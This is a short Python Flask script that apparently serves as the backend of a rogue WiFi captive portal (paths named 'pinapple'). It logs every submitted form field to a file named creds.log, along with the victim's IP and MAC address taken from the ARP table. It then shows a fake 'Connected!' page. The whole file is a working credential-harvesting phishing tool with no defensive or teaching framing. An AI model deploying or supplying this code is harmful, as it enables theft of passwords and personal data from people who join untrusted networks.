#!/usr/bin/env python3
from flask import Flask, request, redirect
import json, os, datetime

app = Flask(__name__)
LOG_FILE = '/var/log/pinapple/creds.log'

def get_client_mac(ip):
    try:
        with open('/proc/net/arp') as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip:
                    return parts[3]
    except:
        pass
    return 'unknown'

@app.route('/portal/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    client_ip = request.headers.get('X-Real-IP', request.remote_addr)
    client_mac = get_client_mac(client_ip)
    entry = {
        'timestamp': datetime.datetime.now().isoformat(),
        'client_ip': client_ip,
        'client_mac': client_mac,
        'portal_type': data.get('portal_type', 'unknown'),
        'data': {k: v for k, v in data.items() if k != 'portal_type'}
    }
    os.makedirs('/var/log/pinapple', exist_ok=True)
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(entry) + '\n')
    return redirect('/portal/success')

@app.route('/portal/success')
def success():
    try:
        with open('/opt/pinapple/portal/success.html') as f:
            return f.read()
    except:
        return '<h1>Connected!</h1>'

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
